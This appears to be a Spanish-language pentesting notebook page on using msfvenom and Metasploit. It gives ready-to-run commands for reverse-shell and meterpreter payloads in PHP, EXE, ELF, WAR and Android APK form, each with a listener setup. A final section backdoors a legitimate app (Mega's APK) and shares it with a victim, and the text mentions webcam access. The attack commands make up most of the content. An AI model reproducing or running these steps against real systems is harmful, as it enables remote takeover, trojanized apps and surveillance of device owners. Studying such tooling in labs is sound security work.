Msfvenom es una herramienta de línea de comandos que forma parte del framework de pruebas de penetración Metasploit. Se utiliza para generar y personalizar payloads (cargas útiles) maliciosos que pueden ser utilizados en ataques de pruebas de penetración y en la explotación de vulnerabilidades en sistemas informáticos.

## TIPOS DE PAYLOADS
Hay dos tipos de payloads, los staged y los non-staged:

- **Payload Staged** --> El Payload Staged es un tipo de carga útil que se descompone en dos o más partes. La primera parte consiste en un fragmento de código que se envía al objetivo con el fin de establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece esta conexión, la segunda parte del payload, que es la verdadera carga útil del ataque, se envía. Este enfoque le da a los atacantes la capacidad de evadir medidas de seguridad adicionales, ya que la verdadera carga útil no se envía hasta que se establece una conexión segura.

- **Payload non-staged** --> Es un tipo de carga útil que se envía como una única entidad y no se divide en múltiples partes. En otras palabras, la carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Aunque este enfoque es más simple que el Payload Staged, es más fácilmente detectable por los sistemas de seguridad, ya que todo el código malicioso se envía de una sola vez, lo que puede hacer que sea más fácilmente identificado y bloqueado.

-------------------------------------

## Fichero PHP malicioso con msfvenom
Para generar un archivo de reverse shell en PHP utilizando msfvenom, puedes utilizar el siguiente comando:

```python
msfvenom -p php/reverse_php LHOST=<tu dirección IP> LPORT=<tu puerto> -f raw > reverse_shell.php
```

Una vez que hayas generado el archivo de reverse shell en PHP, puedes transferirlo a la máquina objetivo y ejecutarlo en un servidor web para establecer una conexión de reverse shell con la máquina atacante.

## Fichero EXE malicioso con msfvenom

Podemos también generar un payload para entablar una reverse shell en forma de meterpreter en metasploit desde una máquina windows a nuestra máquina atacante, generando el siguiente payload:
```python
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.20 LPORT=443 -f exe -o pwned.exe
```

![[Pasted image 20240613011409.png]]

Una vez generado esto, tenemos que abrir el /multi/handler de metasploit seleccionando como payload el meterpreter:
```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

![[Pasted image 20240613011416.png]]

Y ahora desde la máquina víctima, ejecutamos el script creado anteriormente:
![[Pasted image 20240613011426.png]]

Y recibimos sesión de meterpreter:
![[Pasted image 20240613011432.png]]

Aunque también podemos crear un payload que no sea de meterpreter, sino para recibir una shell normal, haciéndolo de la misma forma:
```python
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```
## Fichero ELF malicioso con msfvenom

Los ficheros elf en linux se pueden asemejar a los exe de windows, por lo que haremos lo mismo de antes pero para linux:
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.30 LPORT=443 -f elf -o pwned.elf
```

![[Pasted image 20240613011441.png]]

Lo compartimos con la máquina víctima:
![[Pasted image 20240613011444.png]]

Nos ponemos en la escucha con metasploit usando el payload de meterpreter para linux:
```bash
set PAYLOAD linux/x64/meterpreter/reverse_tcp
```

![[Pasted image 20240613011448.png]]

Ejecutamos el archivo en la máquina víctima y recibimos la conexión:
![[Pasted image 20240613011455.png]]

## Fichero WAR malicioso con msfvenom para hacking tomcat

Estamos ante un servidor tomcat, que por ejemplo se trata de la máquina [[MAQUINA DEPLOY]], donde dentro del puerto 8080 corre un servidor tomcat y se nos muestra que podemos subir un archivo WAR:

![[Pasted image 20240613011504.png]]

```bash
msfvenom -p java/shell_reverse_tcp LHOST=192.168.0.37 LPORT=443 -f war -o revshell.war
```

Lo creamos
![[Pasted image 20240613011517.png]]

Lo subimos y lo tenemos aquí dentro del servidor, donde hacemos clic:
![[Pasted image 20240613011526.png]]

Y recibimos la conexión:
![[Pasted image 20240613011532.png]]

-----------------------------------------

[[MAQUINA SECTALKS (Vulnerabilidad arbitrary file upload, php malicioso con msfvenom, y multi-handler de metasploit)]]

# CREAR APK MALICIOSA
Podemos también crear un payload dentro de un apk y establecer una sesión de meterpreter en metasploit, por tanto usaremos el siguiente comando:
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.30 LPORT=443 > virus.apk
```

![[Pasted image 20240613011542.png]]
Y ahora con metasploit estaremos en la escucha con el multi handler, además de establecer el payload correcto:
```bash
set payload android/meterpreter/reverse_tcp
```

![[Pasted image 20240613011547.png]]
Si la ejecutamos desde un dispositivo android habremos recibido una sesión de meterpreter:

![[Pasted image 20240613011605.png]]

Y podemos acceder a la webcam:
![[Pasted image 20240613011611.png]]

# ESCONDER BACKDOOR EN APK LEGÍTIMA
Primero tenemos que instalar apktool en nuestro kali:
![[Pasted image 20240613011617.png]]

Y también nos bajamos la última versión del apktool:
![[Pasted image 20240613011621.png]]

Otorgamos permisos a los 2 archivos:
![[Pasted image 20240613011625.png]]

Movemos los dos archivos al siguiente directorio:
![[Pasted image 20240613011629.png]]

Y dentro del /usr/local/bin tenemos que renombrar el fichero .jar de esta forma:
![[Pasted image 20240613011634.png]]

Y ahora si ejecutamos el apktool debería funcionar bien:
![[Pasted image 20240613011641.png]]

Y ahora instalaremos estos 3 paquetes:
![[Pasted image 20240613011646.png]]

Ahora el siguiente paso será descargar un apk legítima, por ejemplo la de mega:
![[Pasted image 20240613011650.png]]

Y ahora una vez descargado el apk lo pasamos por msfvenom:
```bash
msfvenom -x mega.apk -p android/meterpreter/reverse_tcp LHOST=192.168.0.36 LPORT=443 -o mega_virus.apk
```

![[Pasted image 20240613011657.png]]

Lo pasamos al dispositivo android y ahora con metasploit nos ponemos en la escucha:
![[Pasted image 20240613011703.png]]

Nos compartimos el apk con la víctima y con metasploit nos ponemos en la escucha, poniendo este payload:
```bash
set payload android/meterpreter/reverse_tcp
```